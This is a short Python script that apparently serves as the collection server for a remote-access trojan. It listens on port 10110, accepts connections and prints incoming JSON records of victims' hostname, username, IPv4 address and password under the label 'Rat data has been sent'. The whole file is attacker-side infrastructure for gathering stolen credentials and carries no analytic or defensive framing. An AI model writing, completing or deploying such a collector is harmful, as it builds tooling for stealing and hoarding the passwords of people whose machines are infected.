import socket
import json
import threading


def send_data(tmp):
    data = json.loads(tmp.decode('utf-8'))
    host = data["host"]
    user = data["user"]
    ipv4 = data["ipv4"]
    password = data["password"]
    print(f"""Rat data has been sent
Hostname: {host}
Username: {user} 
IPV4: {ipv4}
Password: {password}
""")


if __name__ == "__main__":
    s = socket.socket()
    print('Socket created.')

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    s.bind((IPAddr, 10110))
    print('Socket binded with', IPAddr, 'and established connection to port: 10110.')

    s.listen(1)
    print("Waiting for data..")
    print()
    while True:
        c, addr = s.accept()
        tmp = c.recv(1024)
        thread = threading.Thread(target=send_data, args=(tmp, ))
        thread.start()
        thread.join()
